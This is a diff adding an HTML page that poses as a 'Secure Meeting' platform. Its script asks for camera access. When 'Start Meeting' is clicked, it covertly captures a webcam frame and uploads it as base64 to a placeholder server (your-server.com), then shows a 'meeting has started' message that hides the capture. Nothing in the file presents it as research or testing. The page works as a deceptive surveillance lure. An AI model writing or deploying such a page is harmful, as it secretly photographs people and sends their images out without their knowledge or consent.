@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meeting Platform</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 20px;
+        }
+        video, canvas {
+            display: block;
+            margin: 20px auto;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to Secure Meeting</h1>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <button id="capture">Start Meeting</button>
+    
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureButton = document.getElementById('capture');
+        const ctx = canvas.getContext('2d');
+
+        // Access the user's camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(error => {
+                console.error("Camera access denied:", error);
+                alert("Unable to access the camera. Please allow camera access.");
+            });
+
+        captureButton.addEventListener('click', () => {
+            // Set canvas dimensions
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Capture the frame
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert to Base64
+            const imageData = canvas.toDataURL('image/png');
+
+            // Send image to the server
+            fetch('https://your-server.com/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imageData })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Image uploaded successfully:", data);
+            })
+            .catch(error => {
+                console.error("Error uploading image:", error);
+            });
+
+            alert("Your meeting has started!");
+        });
+    </script>
+</body>
+</html>
